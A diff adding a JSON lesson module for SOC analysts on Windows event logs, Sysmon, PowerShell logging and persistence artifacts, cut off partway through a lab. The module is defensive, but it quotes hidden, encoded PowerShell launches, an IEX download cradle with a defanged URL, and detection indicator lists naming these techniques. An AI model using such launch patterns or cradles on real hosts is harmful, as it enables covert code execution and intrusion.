@@ -1,0 +1,1050 @@
+{
+ "code": "SOC-03",
+ "intro": "Windows hosts record rich evidence of authentication, privilege use, process execution and persistence, if auditing is configured to capture it. This module covers where Windows logs live, how to read the key authentication, Kerberos, NTLM and account management events, how logon types reveal how someone connected, what Sysmon adds, how PowerShell logging exposes script content, and which artifacts attackers use to stay on a host. These skills let you turn raw event IDs into attacker behavior.",
+ "lessons": [
+  {
+   "title": "Windows logging architecture",
+   "why": "Before reading an event you need to know where it is stored and whether auditing was even enabled to create it.",
+   "sections": [
+    {
+     "h": "The main logs and channels",
+     "p": [
+      "Windows records events in the Event Log service, stored as .evtx files under C:\\Windows\\System32\\winevt\\Logs. The classic logs are Security, System and Application. The Security log holds audit events such as logons and privilege use and is written by the Local Security Authority. The System log records services, drivers and the operating system. The Application log holds events from installed software. Newer Applications and Services Logs add many operational channels, including Microsoft-Windows-PowerShell/Operational, Microsoft-Windows-Sysmon/Operational, TaskScheduler/Operational and WinRM/Operational. You can browse them in Event Viewer or query them with wevtutil and Get-WinEvent."
+     ]
+    },
+    {
+     "h": "Audit policy decides what is recorded",
+     "p": [
+      "Many security events appear only if the matching audit policy is enabled. Advanced Audit Policy Configuration groups settings into categories such as Account Logon, Logon/Logoff, Account Management, Detailed Tracking (process creation) and Object Access, each with Success and Failure options. If Audit Process Creation is off, event 4688 never appears. Policies are normally deployed through Group Policy. A common finding in investigations is that the needed auditing was not enabled, which is why baselines such as Microsoft or CIS recommendations list the minimum categories to turn on."
+     ]
+    },
+    {
+     "h": "Event structure and size",
+     "p": [
+      "Each event has a System section with fields such as EventID, TimeCreated, Computer and Channel, and an EventData section with details that depend on the event, for example TargetUserName, IpAddress and LogonType. Time is stored in UTC and shown in local time by the viewer, which is a trap when comparing hosts. Logs are circular: when a log reaches its maximum size old events are overwritten. The Security log default of 20 MB can cover only hours on a busy domain controller, so size should be increased and events forwarded."
+     ]
+    },
+    {
+     "h": "Centralizing Windows logs",
+     "p": [
+      "Because attackers with local administrator rights can clear logs, important events should be copied off the host quickly. Windows Event Forwarding (WEF) sends events to a collector using subscriptions, while agents such as Winlogbeat, the Splunk Universal Forwarder or the Azure Monitor Agent ship events to a SIEM. Choose which events to forward, as unfiltered Security logs from every workstation can be very large. A practical approach forwards logon, account management, process creation, PowerShell and Sysmon events from all hosts, with extra detail from domain controllers and servers."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Terminal output (PowerShell)",
+    "text": "PS> Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 2 | Format-List TimeCreated, Id\n\nTimeCreated : 3/14/2025 9:21:07 AM\nId          : 4625\n\nTimeCreated : 3/14/2025 9:21:05 AM\nId          : 4625"
+   },
+   "example": "An investigator opens the Security log on a file server to find a logon from 192.0.2.77 but sees nothing before today. The log is 20 MB and covers only six hours. Checking the SIEM, the forwarded events contain the earlier logon. The finding becomes a recommendation: raise the Security log size, enable process creation auditing and keep forwarding events centrally so evidence survives rollover or deletion.",
+   "terms": [
+    {
+     "term": "EVTX",
+     "def": "The file format used by the Windows Event Log."
+    },
+    {
+     "term": "Channel",
+     "def": "A named log such as Security or Microsoft-Windows-Sysmon/Operational."
+    },
+    {
+     "term": "Audit policy",
+     "def": "Settings that determine which security events are recorded."
+    },
+    {
+     "term": "WEF",
+     "def": "Windows Event Forwarding, a built-in way to collect events centrally."
+    },
+    {
+     "term": "Get-WinEvent",
+     "def": "A PowerShell cmdlet to query event logs."
+    }
+   ],
+   "check": [
+    {
+     "q": "Where does event 4688 appear, if enabled?",
+     "options": [
+      "Security log",
+      "Application log",
+      "Setup log",
+      "Print log"
+     ],
+     "a": 0,
+     "why": "Process creation auditing writes to the Security log."
+    },
+    {
+     "q": "What happens if Audit Process Creation is not enabled?",
+     "options": [
+      "Event 4688 is not generated",
+      "Events are encrypted",
+      "Logs are deleted",
+      "Sysmon stops"
+     ],
+     "a": 0,
+     "why": "Many events depend on the audit policy."
+    },
+    {
+     "q": "Why forward events off the host?",
+     "options": [
+      "Attackers can clear local logs",
+      "It speeds up the host",
+      "Event IDs change",
+      "It disables auditing"
+     ],
+     "a": 0,
+     "why": "Remote copies survive local tampering and rollover."
+    },
+    {
+     "q": "Which cmdlet queries event logs in PowerShell?",
+     "options": [
+      "Get-WinEvent",
+      "Get-Process",
+      "Set-Date",
+      "Test-Path"
+     ],
+     "a": 0,
+     "why": "Get-WinEvent reads event logs with filters."
+    }
+   ],
+   "recap": [
+    "Know Security, System, Application and operational channels.",
+    "Audit policy controls which events exist.",
+    "Forward and size logs so evidence is not lost."
+   ]
+  },
+  {
+   "title": "Authentication events: 4624, 4625, 4634, 4672",
+   "why": "Logon events are the backbone of detecting account abuse, brute force and lateral movement.",
+   "sections": [
+    {
+     "h": "4624 and 4625",
+     "p": [
+      "Event 4624 records a successful logon and 4625 a failed one. Important fields are TargetUserName and TargetDomainName (the account), LogonType (how the logon happened), IpAddress and IpPort (the source), WorkstationName, AuthenticationPackageName (NTLM or Kerberos) and LogonProcessName. Do not confuse SubjectUserName, which is the account that requested the logon, often the machine account or SYSTEM, with TargetUserName, the account that logged on. For 4625 the Status and SubStatus codes explain why it failed, for example 0xC000006A for a bad password and 0xC0000064 for an unknown user name."
+     ]
+    },
+    {
+     "h": "4634, 4647 and logon sessions",
+     "p": [
+      "Event 4634 records that a logon session ended, and 4647 records a user-initiated logoff. Each logon receives a TargetLogonId, and the same value appears in related events such as 4672 and process creation, so you can tie actions to a session. Session duration, from 4624 to 4634 for the same LogonId, helps judge whether a login was brief or persistent. Network logons close quickly, which makes 4634 noisy, so most detections lean on 4624 and 4625 rather than logoff events."
+     ]
+    },
+    {
+     "h": "Privileged logons: 4672",
+     "p": [
+      "Event 4672, Special privileges assigned to new logon, fires when an account with sensitive privileges such as SeDebugPrivilege or SeBackupPrivilege logs on. It is generated for administrators, SYSTEM and some service accounts, and appears right after a 4624 with the same LogonId. A 4672 for an account that should not be privileged, or from an unusual host, deserves attention. Because administrators generate many 4672 events, useful detections focus on first-seen privileged logons, new source hosts for an admin and privileged logons at odd hours."
+     ]
+    },
+    {
+     "h": "Reading patterns",
+     "p": [
+      "Single events say little, patterns say more. Many 4625 events against one account suggest brute force. Many 4625 events against many accounts from one source with one password suggest password spraying. A burst of failures followed by a 4624 for the same account and source suggests success after guessing. Failures of one user across many hosts point to a stale credential or lateral movement attempts. Always note the source address and logon type before judging, since a mistyped password from the user's own laptop is usually a normal event."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Event excerpt",
+    "text": "EventID: 4625\nTargetUserName: svc-backup\nLogonType: 3\nStatus: 0xC000006D  SubStatus: 0xC000006A\nIpAddress: 203.0.113.50\nWorkstationName: -\nAuthenticationPackageName: NTLM\n\n(6 events in 20 s, then 4624 for svc-backup from the same IP)"
+   },
+   "example": "A server logs 40 event 4625 entries in two minutes for the account administrator, all from 203.0.113.50 with LogonType 3 and SubStatus 0xC000006A. Then a 4624 appears for administrator from the same address, followed by a 4672 with the same LogonId. The analyst concludes brute force succeeded, escalates, disables the account and blocks the source, then reviews what the session did.",
+   "terms": [
+    {
+     "term": "4624",
+     "def": "Successful logon event."
+    },
+    {
+     "term": "4625",
+     "def": "Failed logon event."
+    },
+    {
+     "term": "4672",
+     "def": "Special privileges assigned to a new logon."
+    },
+    {
+     "term": "LogonId",
+     "def": "An identifier linking all events in one logon session."
+    },
+    {
+     "term": "SubStatus",
+     "def": "A code giving the detailed reason for a logon failure."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which event ID records a failed logon?",
+     "options": [
+      "4625",
+      "4624",
+      "4634",
+      "4672"
+     ],
+     "a": 0,
+     "why": "4625 is the failure event."
+    },
+    {
+     "q": "SubStatus 0xC000006A indicates:",
+     "options": [
+      "Wrong password for a valid user",
+      "Unknown user",
+      "Account locked",
+      "Expired account"
+     ],
+     "a": 0,
+     "why": "0xC000006A is a bad password."
+    },
+    {
+     "q": "What do 4624 followed by 4672 with the same LogonId suggest?",
+     "options": [
+      "A privileged account logged on",
+      "A printer error",
+      "A log clear",
+      "A reboot"
+     ],
+     "a": 0,
+     "why": "4672 flags sensitive privileges for that session."
+    },
+    {
+     "q": "Which pattern suggests password spraying?",
+     "options": [
+      "One source failing against many accounts",
+      "One user mistyping once",
+      "One account logging off",
+      "A single 4634"
+     ],
+     "a": 0,
+     "why": "Spraying tries few passwords across many accounts."
+    }
+   ],
+   "recap": [
+    "4624 success, 4625 failure, 4634/4647 logoff, 4672 privileged.",
+    "Use LogonId to tie events together.",
+    "Judge patterns, not single events."
+   ]
+  },
+  {
+   "title": "Logon types and Kerberos/NTLM events",
+   "why": "The logon type tells you how the person connected, and Kerberos or NTLM events show how credentials were validated.",
+   "sections": [
+    {
+     "h": "Common logon types",
+     "p": [
+      "The LogonType field in 4624 reveals the method. Type 2 is interactive at the keyboard. Type 3 is network, such as file share access or remote administration tools. Type 4 is batch (scheduled tasks) and type 5 is service. Type 7 is unlock, type 8 is network cleartext, type 9 is NewCredentials (runas /netonly) and type 10 is RemoteInteractive, meaning Remote Desktop. Type 11 is cached interactive, used when the domain controller is unreachable. Types 3 and 10 from external or unusual addresses are the first to review, and type 10 outside business hours is a classic lateral movement or intrusion indicator."
+     ]
+    },
+    {
+     "h": "What looks suspicious",
+     "p": [
+      "Context matters. Many type 3 logons are normal, since every file share access produces one. Type 5 service logons are routine. Concern arises when a service or admin account performs a type 10 logon to a workstation, when a type 2 logon appears on a server nobody physically visits, or when a type 3 logon with NTLM comes from a workstation to many servers within minutes. Pass-the-hash often shows as type 3 with NTLM and a blank workstation name. Compare against a baseline of which accounts normally log on to which hosts."
+     ]
+    },
+    {
+     "h": "Kerberos events",
+     "p": [
+      "In an Active Directory domain, Kerberos activity is logged on domain controllers. Event 4768 is a request for a Ticket Granting Ticket (TGT) after authentication. Event 4769 is a request for a service ticket (TGS), and 4771 is a pre-authentication failure. Look at the ticket encryption type: 0x17 (RC4) in an environment that should use AES (0x12) is a possible sign of Kerberoasting, where an attacker requests service tickets to crack offline. Many 4769 requests for different service accounts from one user in a short time are also a warning sign."
+     ]
+    },
+    {
+     "h": "NTLM events",
+     "p": [
+      "NTLM validation appears as event 4776, Computer attempted to validate the credentials for an account, logged on the system that performs validation, which is the domain controller for domain accounts. A burst of 4776 failures from one workstation can indicate spraying or brute force, while NTLM use where Kerberos is expected may reveal access by IP address rather than host name, a common tool behavior. Many organizations restrict or audit NTLM to reduce the attack surface. Correlate 4776 with 4625 and 4624 to see whether the attempt succeeded."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Event excerpt",
+    "text": "EventID 4624  LogonType: 10  Account: jsmith\nIpAddress: 198.51.100.88 (external)\nTime: 03:12:44Z\n\nEventID 4769  ServiceName: MSSQLSvc/db01.example.com\nTicketEncryptionType: 0x17  ClientAddress: 192.0.2.61"
+   },
+   "example": "An analyst reviews 4624 events and finds LogonType 10 for jsmith from 198.51.100.88 at 03:12 UTC. Business hours are 08:00 to 18:00 and jsmith normally uses a VPN address range. The source is external, and Remote Desktop should not be open to the internet. The analyst escalates as a suspected compromised account, checks for firewall rules exposing port 3389 and reviews the session's activity.",
+   "terms": [
+    {
+     "term": "Logon type 10",
+     "def": "RemoteInteractive, such as Remote Desktop."
+    },
+    {
+     "term": "Logon type 3",
+     "def": "Network logon, for example SMB file share access."
+    },
+    {
+     "term": "4768/4769",
+     "def": "Kerberos TGT and service ticket requests."
+    },
+    {
+     "term": "Kerberoasting",
+     "def": "Requesting service tickets to crack service account passwords offline."
+    },
+    {
+     "term": "4776",
+     "def": "NTLM credential validation event."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which logon type is Remote Desktop?",
+     "options": [
+      "10",
+      "2",
+      "5",
+      "3"
+     ],
+     "a": 0,
+     "why": "Type 10 is RemoteInteractive."
+    },
+    {
+     "q": "Event 4769 documents:",
+     "options": [
+      "A Kerberos service ticket request",
+      "A failed password",
+      "A log clear",
+      "A new service"
+     ],
+     "a": 0,
+     "why": "4769 is a TGS request."
+    },
+    {
+     "q": "A ticket encryption type 0x17 in an AES-only environment may indicate:",
+     "options": [
+      "Kerberoasting",
+      "Normal activity always",
+      "A printer",
+      "Disk failure"
+     ],
+     "a": 0,
+     "why": "RC4 requests are a Kerberoasting indicator."
+    },
+    {
+     "q": "Where is event 4776 for domain accounts logged?",
+     "options": [
+      "Domain controller",
+      "Printer",
+      "Mobile device",
+      "Router"
+     ],
+     "a": 0,
+     "why": "The system validating credentials logs 4776."
+    }
+   ],
+   "recap": [
+    "Logon type tells how the connection occurred.",
+    "Type 10 from unusual sources is high priority.",
+    "4768/4769 cover Kerberos, 4776 covers NTLM."
+   ]
+  },
+  {
+   "title": "Account and group change events",
+   "why": "Attackers create accounts, add themselves to groups and erase logs; these events expose that stage.",
+   "sections": [
+    {
+     "h": "Account creation and changes",
+     "p": [
+      "Event 4720 records that a user account was created, and the fields show who created it (SubjectUserName) and the new account (TargetUserName). Related events include 4722 account enabled, 4724 password reset attempt, 4723 password change, 4725 account disabled and 4726 account deleted. Attackers create backdoor accounts for persistence, often with names resembling service accounts. Alert on accounts created outside the normal provisioning process or system, especially at odd hours or by a non-administrator, and verify with the help desk or identity management team."
+     ]
+    },
+    {
+     "h": "Group membership and privilege",
+     "p": [
+      "Adding an account to a privileged group is a high-value signal. Event 4728 is a member added to a security-enabled global group, 4732 to a local group such as Administrators, and 4756 to a universal group. The event shows the group name, the member and the actor. Watch Domain Admins, Enterprise Admins, Administrators, Backup Operators and Account Operators. Removal events 4729, 4733 and 4757 exist too. An attacker may add a new account to Administrators, use it and later remove it, leaving only the add and remove events as evidence."
+     ]
+    },
+    {
+     "h": "Lockouts and log clearing",
+     "p": [
+      "Event 4740 records an account lockout and names the caller computer, which is the source of the failing attempts. Many lockouts across accounts may indicate spraying, while one account repeatedly locking may be a stale credential on a device. Event 1102 in the Security log means the audit log was cleared, and event 104 in the System log means another log was cleared. Log clearing is rarely routine and is a strong indicator of attacker cover-up, so it should raise a high severity alert and begin a review of any forwarded copies."
+     ]
+    },
+    {
+     "h": "Putting changes into context",
+     "p": [
+      "Individual changes are usually legitimate, so context decides the verdict. Ask: who performed it, from which host, at what time, and was there a change ticket? A new local administrator added by the IT deployment tool at noon with a ticket is routine. The same change made by a user account from a workstation at 02:00 is not. Pair these events with logon events to see the actor's session, with process creation to see the tool used, and with later logons by the new account to see whether it was used."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Event excerpts",
+    "text": "4720 Subject: it-helpdesk  Target: svc-update2  (2025-03-14 02:14:10Z)\n4732 Subject: it-helpdesk  Member: svc-update2  Group: Administrators\n1102 Subject: svc-update2  The audit log was cleared\n\n(no change ticket found)"
+   },
+   "example": "At 02:14 UTC the account it-helpdesk creates svc-update2 (4720) and adds it to Administrators (4732). Minutes later svc-update2 clears the Security log (1102). No ticket exists for the change. The analyst treats this as an active compromise: disables both accounts, isolates the host, retrieves the forwarded copies of the logs from the SIEM and starts incident response.",
+   "terms": [
+    {
+     "term": "4720",
+     "def": "A user account was created."
+    },
+    {
+     "term": "4732",
+     "def": "A member was added to a local security group."
+    },
+    {
+     "term": "4740",
+     "def": "An account was locked out."
+    },
+    {
+     "term": "1102",
+     "def": "The Security audit log was cleared."
+    },
+    {
+     "term": "104",
+     "def": "A log in the System channel was cleared."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which event records an account creation?",
+     "options": [
+      "4720",
+      "4740",
+      "4625",
+      "7045"
+     ],
+     "a": 0,
+     "why": "4720 is user account created."
+    },
+    {
+     "q": "Event 1102 means:",
+     "options": [
+      "The Security log was cleared",
+      "A service was installed",
+      "A password changed",
+      "A logon succeeded"
+     ],
+     "a": 0,
+     "why": "1102 is the audit log cleared event."
+    },
+    {
+     "q": "Which event shows a member added to a local group such as Administrators?",
+     "options": [
+      "4732",
+      "4728 only",
+      "4624",
+      "4688"
+     ],
+     "a": 0,
+     "why": "4732 is local group membership addition."
+    },
+    {
+     "q": "What does the caller computer in 4740 identify?",
+     "options": [
+      "The source of failing attempts",
+      "The domain controller backup",
+      "The printer",
+      "The patch level"
+     ],
+     "a": 0,
+     "why": "It names where the bad credentials came from."
+    }
+   ],
+   "recap": [
+    "4720 creation, 4728/4732/4756 group adds, 4740 lockout.",
+    "1102 and 104 are strong cover-up indicators.",
+    "Judge changes by actor, host, time and ticket."
+   ]
+  },
+  {
+   "title": "Sysmon configuration and key events",
+   "why": "Sysmon records detailed process, network and file activity that default Windows logging omits.",
+   "sections": [
+    {
+     "h": "What Sysmon is",
+     "p": [
+      "System Monitor (Sysmon) is a free Microsoft Sysinternals driver and service that writes detailed events to Microsoft-Windows-Sysmon/Operational. Unlike default logging, it records process creation with the full command line, parent process, hashes and signer, network connections per process, driver and image loads, and more. It is configured with an XML file that decides which events to include or exclude. Install with sysmon -accepteula -i config.xml and update with sysmon -c config.xml. Because it is highly configurable, results depend entirely on the quality of the configuration."
+     ]
+    },
+    {
+     "h": "Key event IDs",
+     "p": [
+      "Event 1 is process creation with Image, CommandLine, ParentImage, ParentCommandLine, Hashes and User. Event 3 is a network connection with source and destination IPs and ports, and the process. Event 7 is image (DLL) loaded. Event 8 is CreateRemoteThread, often used in injection. Event 10 is ProcessAccess, important for credential dumping when a process opens lsass.exe. Event 11 is file creation. Event 13 is registry value set, useful for Run keys. Others include 12 and 14 registry events, 22 DNS query and 19 to 21 WMI event activity."
+     ]
+    },
+    {
+     "h": "Configuration and community baselines",
+     "p": [
+      "Writing a configuration from scratch is difficult, so most teams start from a community template such as the SwiftOnSecurity sysmon-config or Olaf Hartong's sysmon-modular. These include or exclude events by rule: for example, logging all process creation except known noisy updaters, network connections from suspicious binaries, and registry changes in autostart locations. They add rule names mapped to MITRE ATT&CK technique IDs. Test any config for volume before deploying widely, and tune exclusions to avoid blind spots, as an overly broad exclusion can hide attacker activity."
+     ]
+    },
+    {
+     "h": "Using Sysmon in an investigation",
+     "p": [
+      "Sysmon events share fields that allow pivoting. ProcessGuid uniquely identifies a process instance, unlike ProcessId which can be reused, and ParentProcessGuid links child to parent so that you can rebuild a process tree. Hashes can be checked against reputation. Network events show which process made a connection, which firewall logs cannot. Combine event 1 (what started), event 3 (who it talked to) and event 11 (what it dropped) to understand a malicious process. Remember that Sysmon is evidence on the host, so forward its logs and protect the service from tampering."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Sysmon event 1",
+    "text": "EventID: 1\nUtcTime: 2025-03-14 09:30:12\nImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA...\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nUser: EXAMPLE\\jlee\nProcessGuid: {a1b2-0001}  ParentProcessGuid: {a1b2-0000}"
+   },
+   "example": "A user opens an invoice document and Sysmon logs event 1 with WINWORD.EXE as the parent of cmd.exe, which starts powershell.exe with a hidden window and an encoded command. Event 3 shows powershell.exe connecting to 198.51.100.9 on port 443, and event 11 shows a new file in the user's temp folder. The chain Word to cmd to PowerShell to external connection is a strong sign of a malicious macro.",
+   "terms": [
+    {
+     "term": "Sysmon",
+     "def": "A Sysinternals tool that logs detailed host activity."
+    },
+    {
+     "term": "ProcessGuid",
+     "def": "A unique identifier for a process instance."
+    },
+    {
+     "term": "Event 10",
+     "def": "ProcessAccess, used to spot access to lsass.exe."
+    },
+    {
+     "term": "Event 13",
+     "def": "Registry value set."
+    },
+    {
+     "term": "sysmon-config",
+     "def": "A community configuration template such as SwiftOnSecurity's."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which Sysmon event logs process creation?",
+     "options": [
+      "1",
+      "3",
+      "11",
+      "13"
+     ],
+     "a": 0,
+     "why": "Event 1 is process creation."
+    },
+    {
+     "q": "Why is ProcessGuid better than ProcessId for tracing?",
+     "options": [
+      "PIDs can be reused",
+      "GUIDs are shorter",
+      "PIDs are encrypted",
+      "GUIDs are always zero"
+     ],
+     "a": 0,
+     "why": "Process IDs repeat, GUIDs stay unique."
+    },
+    {
+     "q": "Sysmon event 3 records:",
+     "options": [
+      "A network connection",
+      "A file hash",
+      "A DNS cache",
+      "A user logoff"
+     ],
+     "a": 0,
+     "why": "Event 3 shows process network connections."
+    },
+    {
+     "q": "What does a Sysmon configuration file control?",
+     "options": [
+      "Which events are included or excluded",
+      "Windows license",
+      "Disk size",
+      "User passwords"
+     ],
+     "a": 0,
+     "why": "The XML rules shape what is logged."
+    }
+   ],
+   "recap": [
+    "Sysmon adds command line, hashes, network and file events.",
+    "Know IDs 1, 3, 7, 8, 10, 11 and 13.",
+    "Start from a community config and tune for volume."
+   ]
+  },
+  {
+   "title": "Process creation and PowerShell logging",
+   "why": "Command lines and script content reveal exactly what an attacker ran, even when the payload is obfuscated.",
+   "sections": [
+    {
+     "h": "Event 4688 and command lines",
+     "p": [
+      "Windows event 4688 records process creation in the Security log. By default it lacks the command line, but enabling the policy Include command line in process creation events (under Administrative Templates, System, Audit Process Creation) adds it. Key fields are NewProcessName, ParentProcessName (or CreatorProcessName), SubjectUserName and CommandLine. Compare it with Sysmon event 1, which also gives hashes and unique GUIDs. Both are valuable, and 4688 is available without installing anything. Command lines can contain secrets such as passwords, so access to these logs must be controlled."
+     ]
+    },
+    {
+     "h": "PowerShell logging",
+     "p": [
+      "PowerShell offers several logs. Module logging records pipeline execution as event 4103. Script block logging records the actual code executed as event 4104 in the Microsoft-Windows-PowerShell/Operational channel, including content decoded at runtime, which defeats much obfuscation. Transcription writes sessions to text files. Enable script block logging through Group Policy, and PowerShell 5 and later also logs suspicious blocks even when not enabled. Event 4104 includes ScriptBlockText, a Path and a ScriptBlockId, and long scripts are split over several events with message numbers."
+     ]
+    },
+    {
+     "h": "Decoding encoded commands",
+     "p": [
+      "Attackers use powershell -enc or -EncodedCommand with a Base64 string to hide content. PowerShell expects UTF-16LE text, so decoding means Base64 decoding and reading as UTF-16LE. For example SQBFAFgA decodes to the characters I, E, X, short for Invoke-Expression. After decoding, look for download cradles such as Net.WebClient DownloadString or Invoke-WebRequest, URLs, hidden window flags, bypass flags like -ep bypass and -nop, and obfuscation. Always decode in a safe, isolated tool and never run the result."
+     ]
+    },
+    {
+     "h": "Indicators to review",
+     "p": [
+      "Suspicious signals include PowerShell launched by Office, a browser or a scripting host, command lines with -w hidden, -enc, IEX, FromBase64String, and download methods. Also review long command lines, unusual parents such as wmiprvse.exe, and PowerShell on servers that never use it. Context matters, since administrators and deployment tools also use PowerShell, often with signed scripts and known paths. Compare with the host's baseline, and examine the network event that follows, since a script that downloads something should show a connection to an external address."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Terminal output",
+    "text": "$ echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=' | base64 -d | iconv -f UTF-16LE -t UTF-8\nIEX (New-Object)\n\n# 4104 fields: ScriptBlockText, ScriptBlockId, Path"
+   },
+   "example": "Event 4104 contains a Base64 string passed to powershell with -enc. The analyst decodes it as UTF-16LE and reads a Net.WebClient DownloadString call to hxxp://example[.]com/stage.ps1 followed by IEX. The host, user, parent process and time go into the case, the URL is defanged and blocked at the proxy, and the analyst searches for other hosts that connected to the same URL.",
+   "terms": [
+    {
+     "term": "4688",
+     "def": "Windows event for process creation."
+    },
+    {
+     "term": "4104",
+     "def": "PowerShell script block logging event."
+    },
+    {
+     "term": "-enc",
+     "def": "PowerShell parameter for a Base64 encoded command."
+    },
+    {
+     "term": "UTF-16LE",
+     "def": "The text encoding PowerShell expects inside encoded commands."
+    },
+    {
+     "term": "Download cradle",
+     "def": "Code that fetches and runs content from a remote location."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which event contains actual PowerShell script text?",
+     "options": [
+      "4104",
+      "4624",
+      "4720",
+      "1102"
+     ],
+     "a": 0,
+     "why": "4104 logs script blocks."
+    },
+    {
+     "q": "PowerShell encoded commands use which encoding before Base64?",
+     "options": [
+      "UTF-16LE",
+      "ASCII only",
+      "UTF-32",
+      "EBCDIC"
+     ],
+     "a": 0,
+     "why": "-enc strings are Base64 of UTF-16LE text."
+    },
+    {
+     "q": "What must be enabled to see command lines in 4688?",
+     "options": [
+      "Include command line in process creation events",
+      "Remote Desktop",
+      "BitLocker",
+      "Windows Update"
+     ],
+     "a": 0,
+     "why": "A policy setting adds the command line."
+    },
+    {
+     "q": "Which is a common sign of a malicious PowerShell launch?",
+     "options": [
+      "Parent is Word with -w hidden -enc",
+      "Launched by an administrator console with a signed script",
+      "Run by Windows Update",
+      "Parent is explorer for a user shortcut"
+     ],
+     "a": 0,
+     "why": "Office parent plus hidden encoded commands is suspicious."
+    }
+   ],
+   "recap": [
+    "4688 plus command line, 4103 module and 4104 script block logs.",
+    "Decode -enc as Base64 UTF-16LE.",
+    "Check parent, flags, URLs and the follow-on network event."
+   ]
+  },
+  {
+   "title": "Persistence artifacts",
+   "why": "Persistence lets an attacker survive reboots, so finding it is key to complete eradication.",
+   "sections": [
+    {
+     "h": "Registry Run keys and startup folders",
+     "p": [
+      "The most common autostart locations are the Run and RunOnce keys: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and the HKLM equivalent. Programs listed there start at logon. The Startup folders, such as C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup, work similarly. Sysmon event 13 shows registry values being set, and event 11 shows files created in startup folders. Look for entries pointing to user-writable paths such as AppData or Temp, random names, or script interpreters launching scripts."
+     ]
+    },
+    {
+     "h": "Scheduled tasks and services",
+     "p": [
+      "Scheduled tasks are created with schtasks or the Task Scheduler API and logged as event 4698 in the Security log (if auditing is on) and in the TaskScheduler/Operational channel. Review the action, trigger and creator. A task that runs powershell or a file from a temp folder every few minutes is suspicious. Services are installed with sc or tools like PsExec and logged as event 7045 in the System log, with the service name, image path and account. A service whose binary sits in a temp or user directory, or uses cmd /c in its image path, needs investigation."
+     ]
+    },
+    {
+     "h": "WMI subscriptions and other methods",
+     "p": [
+      "Windows Management Instrumentation (WMI) event subscriptions use an EventFilter, an EventConsumer and a FilterToConsumerBinding to run code when a condition occurs. They leave few traces in common locations, but Sysmon events 19, 20 and 21 record them. Other methods include DLL search order hijacking, the Winlogon registry keys, Image File Execution Options, COM hijacking, new local accounts and rogue browser extensions. Tools such as Sysinternals Autoruns list most autostart locations at once and can compare against a known-good baseline."
+     ]
+    },
+    {
+     "h": "Verifying and responding",
+     "p": [
+      "When you find a candidate, check the file path, hash, signer, creation time and who or what created it. Compare creation time with the intrusion timeline. Document it, collect a copy for analysis, then remove it only as part of coordinated eradication so you do not alert the attacker or lose evidence. After removal, verify across other hosts, since attackers often install the same mechanism widely. Add detections for the technique, for example alerting on new Run key values pointing to AppData, and on 4698 or 7045 for unapproved binaries."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Findings (Autoruns style)",
+    "text": "HKCU\\...\\Run  Updater  C:\\Users\\jlee\\AppData\\Roaming\\upd.exe  (unsigned)\nTask  \\GoogleUpdateX  powershell -w hidden -f C:\\ProgramData\\x.ps1\nService  WinSvcHelper  C:\\Windows\\Temp\\svc.exe  (7045, 02:20Z)"
+   },
+   "example": "An exported host image reveals a Run key value Updater pointing to AppData\\upd.exe, an unsigned file created at 09:35 UTC, five minutes after the PowerShell event. A scheduled task named like a Google updater runs a hidden PowerShell script. Both tie to the same time and user, so the analyst lists them as malicious persistence and recommends removing them during eradication.",
+   "terms": [
+    {
+     "term": "Run key",
+     "def": "A registry location whose entries start at logon."
+    },
+    {
+     "term": "4698",
+     "def": "A scheduled task was created."
+    },
+    {
+     "term": "7045",
+     "def": "A service was installed on the system."
+    },
+    {
+     "term": "WMI subscription",
+     "def": "A persistence method using filters, consumers and bindings."
+    },
+    {
+     "term": "Autoruns",
+     "def": "A Sysinternals tool that lists autostart entries."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which event records a service installation?",
+     "options": [
+      "7045",
+      "4698",
+      "4688",
+      "1102"
+     ],
+     "a": 0,
+     "why": "7045 appears in the System log."
+    },
+    {
+     "q": "Which event records scheduled task creation in the Security log?",
+     "options": [
+      "4698",
+      "4720",
+      "4672",
+      "4634"
+     ],
+     "a": 0,
+     "why": "4698 is a scheduled task created."
+    },
+    {
+     "q": "A Run key value pointing to AppData\\random.exe is:",
+     "options": [
+      "Suspicious",
+      "Always safe",
+      "Required by Windows",
+      "A DNS entry"
+     ],
+     "a": 0,
+     "why": "User-writable paths in autostarts are a red flag."
+    },
+    {
+     "q": "Which Sysmon IDs cover WMI event activity?",
+     "options": [
+      "19, 20 and 21",
+      "1, 2 and 3",
+      "7 and 8",
+      "22 only"
+     ],
+     "a": 0,
+     "why": "Sysmon 19 to 21 record WMI filters, consumers and bindings."
+    }
+   ],
+   "recap": [
+    "Check Run keys, startup folders, tasks, services and WMI.",
+    "Correlate creation time with the intrusion timeline.",
+    "Remove persistence during planned eradication and verify elsewhere."
+   ]
+  }
+ ],
+ "labs": [
+  {
+   "title": "Failed logon triage",
+   "sim": "log-viewer",
+   "scenario": "The Security log from fictional server fs01 (192.0.2.20) holds 200 events. You must filter 4625, identify brute force against one account and find the first successful logon afterward.",
+   "objective": "Identify the targeted account, source IP and first successful logon.",
+   "steps": [
+    {
+     "do": "Filter EventID = 4625",
+     "see": "78 events shown"
+    },
+    {
+     "do": "Group by TargetUserName",
+     "see": "administrator: 71, jsmith: 4, svc-print: 3"
+    },
+    {
+     "do": "Open one administrator event",
+     "see": "LogonType 3, IpAddress 203.0.113.50, SubStatus 0xC000006A"
+    },
+    {
+     "do": "Group administrator failures by IpAddress",
+     "see": "203.0.113.50: 71 (09:01:10Z to 09:04:55Z)"
+    },
+    {
